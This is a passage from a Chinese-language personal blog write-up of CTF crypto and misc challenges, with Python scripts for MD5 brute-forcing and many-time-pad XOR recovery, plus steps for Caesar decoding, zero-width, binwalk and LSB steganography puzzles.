class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        <span class="keyword">if</span> count==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(j.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest() == i:</span><br><span class="line">                result+=j</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">str</span>=<span class="string">f&quot;<span class="subst">&#123;result+j&#125;</span>&quot;</span></span><br><span class="line">            <span class="built_in">str</span>=<span class="built_in">list</span>(<span class="built_in">str</span>)</span><br><span class="line">            <span class="comment"># print(str)</span></span><br><span class="line">            a=<span class="built_in">int</span>(hashlib.md5(<span class="built_in">str</span>[count-<span class="number">1</span>].encode()).hexdigest(),<span class="number">16</span>)</span><br><span class="line">            b=<span class="built_in">int</span>(hashlib.md5(<span class="built_in">str</span>[count-<span class="number">2</span>].encode()).hexdigest(),<span class="number">16</span>)</span><br><span class="line">            <span class="comment"># print(hex(int(a^b))[2:])</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hex</span>(<span class="built_in">int</span>(a^b))[<span class="number">2</span>:]==i:</span><br><span class="line">                result+=j</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570032515-992354d8-5caa-4f41-9fb8-2e2a1677e811.png#averageHue=%2332302f&clientId=u92cace27-3367-4&from=paste&height=45&id=u1adfbc63&name=image.png&originHeight=56&originWidth=539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8828&status=done&style=none&taskId=u4f1b0be7-caf5-41b1-9dfb-6a634689871&title=&width=431.2" alt="image.png"></p>
<h2 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h2><p>位移是19：<br><code>B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY&#125;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570107208-cabc0763-73da-4e0b-a476-399f8127f586.png#averageHue=%23ebeaea&clientId=u92cace27-3367-4&from=paste&height=663&id=ubd73e473&name=image.png&originHeight=829&originWidth=1347&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95159&status=done&style=none&taskId=ufc8ff717-5540-4f2a-809a-4b45c6a36b5&title=&width=1077.6" alt="image.png"><br>写wp真不想搞了，累了</p>
<h2 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h2><p>简单的多次一密，网上搬了一个脚本：稍微改了点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    c.append(long_to_bytes(<span class="built_in">int</span>(i,<span class="number">16</span>)))</span><br><span class="line">m=<span class="string">&#x27;In the flood of darkness, hope is the light. It brings comfort, faith, and confidence. It gives usguidance when we are lost, and gives support whenwe are afraid. And the moment we give up hope,we give up our lives. The world we live in is disintegrating into a place of malice and hatred, where we need hope and find it harder. In this worldof fear,hope to find better, but easier said than done, themore meaningful life of faith will make life meaningful.&#x27;</span></span><br><span class="line">ls=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(m),<span class="number">42</span>):</span><br><span class="line">    ls.append(m[i:i+<span class="number">42</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    flag=strxor(c[i],ls[i][:<span class="number">29</span>].encode())</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>第一版脚本跑出来结果是比较乱的码，但是大致可以看到flag在里面，然后找了一下明文，也就是下面脚本里的m，最后跑出flag：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668831636566-3491d917-d5a4-41a2-a861-c9fefdb72aae.png#averageHue=%2388815b&clientId=uc5121b2d-11d4-4&from=paste&height=559&id=ua53b8b96&name=image.png&originHeight=699&originWidth=1911&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167595&status=done&style=none&taskId=u48da8e62-0a66-40b1-b092-16fcbe90690&title=&width=1528.8" alt="image.png"><br>也别说跑出的，其实类似于撞出来的	</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h2><p>这边就是0宽度隐写：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570158992-4e9713a5-b804-469a-bf85-48ca19834da2.png#averageHue=%23d2d2d2&clientId=u92cace27-3367-4&from=paste&height=592&id=u6767d7ca&name=625E1FA0C6622CDCDA5E16F13645EE82.png&originHeight=740&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=210492&status=done&style=none&taskId=u5ad122e1-daa9-4b3a-baeb-5302655e10a&title=&width=964.8" alt="625E1FA0C6622CDCDA5E16F13645EE82.png"><br>改字体，然后解密：<br>![DUE})AD1TIMPLHF]NKD}HAX.png](<a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570173937-17b740a3-890c-4e24-9296-54d9459dcd83.png#averageHue=%23f2f2f2&amp;clientId=u92cace27-3367-4&amp;from=paste&amp;height=414&amp;id=uc903caff&amp;name=DUE%7D%29AD1TIMPLHF%5DNKD%7DHAX.png&amp;originHeight=518&amp;originWidth=1888&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=281355&amp;status=done&amp;style=none&amp;taskId=ucf22cda5-f021-4d5a-83dd-51c1b9f2f7b&amp;title=&amp;width=1510.4">https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570173937-17b740a3-890c-4e24-9296-54d9459dcd83.png#averageHue=%23f2f2f2&amp;clientId=u92cace27-3367-4&amp;from=paste&amp;height=414&amp;id=uc903caff&amp;name=DUE%7D%29AD1TIMPLHF%5DNKD%7DHAX.png&amp;originHeight=518&amp;originWidth=1888&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=281355&amp;status=done&amp;style=none&amp;taskId=ucf22cda5-f021-4d5a-83dd-51c1b9f2f7b&amp;title=&amp;width=1510.4</a>)</p>
<h2 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570226131-d5f270c3-4657-4f69-ae85-93896eccd865.png#averageHue=%23cbdbbd&clientId=u92cace27-3367-4&from=paste&height=34&id=ub8bb4302&name=image.png&originHeight=42&originWidth=974&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3655&status=done&style=none&taskId=u09b2662b-9681-4300-82ec-63fc802de52&title=&width=779.2" alt="image.png"></h2><p>一个文件binkwalk分离：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570273883-6c2242de-552f-4b66-b9a4-78f95c28ad75.png#averageHue=%23c7c9a4&clientId=u92cace27-3367-4&from=paste&height=72&id=u991abea8&name=image.png&originHeight=90&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21274&status=done&style=none&taskId=ub45b8a75-7e6d-4be7-bdb5-31dc8528889&title=&width=682.4" alt="image.png"><code>password is U6nu2_i3_b3St</code>：<br>解压分理处的文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570310959-bac187ff-99ce-4c7c-b4a6-47574eb48aaf.png#averageHue=%23c5f3f1&clientId=u92cace27-3367-4&from=paste&height=147&id=u2cd8bcec&name=image.png&originHeight=184&originWidth=960&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17972&status=done&style=none&taskId=u9ee5c471-ce6c-4769-82f9-4ec003b8a98&title=&width=768" alt="image.png"></p>
<h2 id="我小心海也绝非鳝类"><a href="#我小心海也绝非鳝类" class="headerlink" title="我小心海也绝非鳝类"></a>我小心海也绝非鳝类</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668829441093-90d911c6-de4f-47d8-88a6-ac9821897778.png#averageHue=%23494949&clientId=uc5121b2d-11d4-4&from=paste&height=382&id=u7d4eac09&name=image.png&originHeight=478&originWidth=1608&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43015&status=done&style=none&taskId=uf60e6490-112d-4267-a383-7b8f4907853&title=&width=1286.4" alt="image.png"><br> 看起来像base，解出来是flaginmd5<br>然后010editor发现末尾有一串base64<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668829457960-939b95c9-2395-4aaa-b68a-465d695a1edc.png#averageHue=%2336342f&clientId=uc5121b2d-11d4-4&from=paste&height=97&id=u7512a7f5&name=image.png&originHeight=121&originWidth=539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17764&status=done&style=none&taskId=uc799ae8d-b432-45f2-b7d3-84b83da37db&title=&width=431.2" alt="image.png"><br>解出来是EASYLSB<br>应该是考LSB隐写，结合前面的字符，可能是有密码的LSB，密码就是前面的那个flaginmd5<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668830590715-2aff1a3a-97fc-4c8d-a789-6c3cbf5a9678.png#averageHue=%23335554&clientId=uc5121b2d-11d4-4&from=paste&height=484&id=uf45f8bc2&name=image.png&originHeight=605&originWidth=1353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=212644&status=done&style=none&taskId=u92201435-ef36-45c7-baf5-a5051c18c36&title=&width=1082.4" alt="image.png"><br>  结合密码flaginmd5，这一长串可能是很多个md5值，前面试了两个刚好是fl,于是写脚本爆破 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">res=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">dict</span>=<span class="string">&quot;qwertyuiopasdfghjklzxcvbnm&#123;&#125;_-&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    i=i.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(i),<span class="number">32</span>):</span><br><span class="line">        <span class="built_in">str</span>=i[j:j+<span class="number">32</span>]</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            <span class="comment"># print(hashlib.md5(m.encode(&quot;utf-8&quot;)).hexdigest().upper())</span></span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(m.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest().upper()==<span class="built_in">str</span>:</span><br><span class="line">                res+=m</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668831155831-658be5d4-edd5-4a36-87e2-3c917c6d8464.png#averageHue=%23907c5c&clientId=uc5121b2d-11d4-4&from=paste&height=452&id=u5053133a&name=image.png&originHeight=565&originWidth=1904&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101643&status=done&style=none&taskId=u7c7be666-8fa3-4598-9b6d-2fc336a26be&title=&width=1523.2" alt="image.png"><br><code>Flag:flag&#123;welcome_to_misc&#125; </code></p>
<h2 id="芝麻开门"><a href="#芝麻开门" class="headerlink" title="芝麻开门"></a>芝麻开门</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668831230379-5fe141d0-d0f0-4909-9d8e-0649085c864d.png#averageHue=%23eaeec1&clientId=uc5121b2d-11d4-4&from=paste&height=288&id=ucc2d9797&name=image.png&originHeight=360&originWidth=943&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51399&status=done&style=none&taskId=ud1371782-6242-446a-b7f2-30ea65700ae&title=&width=754.4" alt="image.png"><br>看到个key，然后别被骗了，往下翻才是真正的key：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668831245021-cdffb038-df5a-4396-b787-7324f6f30e25.png#averageHue=%23313942&clientId=uc5121b2d-11d4-4&from=paste&height=120&id=ubb6df957&name=image.png&originHeight=150&originWidth=933&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5661&status=done&style=none&taskId=u8694e3c2-65e3-49c2-906e-9e3aa4c606e&title=&width=746.4" alt="image.png"><br>解密出来是key1<br>猜测和上一把一样，也是一把嗦一下看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668831311663-5841587d-a474-43f9-b0c6-364a1603ec6a.png#averageHue=%232d4347&clientId=uc5121b2d-11d4-4&from=paste&height=407&id=ued1e8dcf&name=image.png&originHeight=509&originWidth=1425&originalType=binary&ratio=1&rotation=0&showTitle=false&size=245968&status=done&style=none&taskId=uca2f4bec-9fe3-4e64-a108-8ecb9b9967c&title=&width=1140" alt="image.png"><br>flag直接就出来了，芜湖~</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/DASCTF%20X%20CBCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">DASCTF 五月出题人挑战赛</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982022/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">极客大挑战2022</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>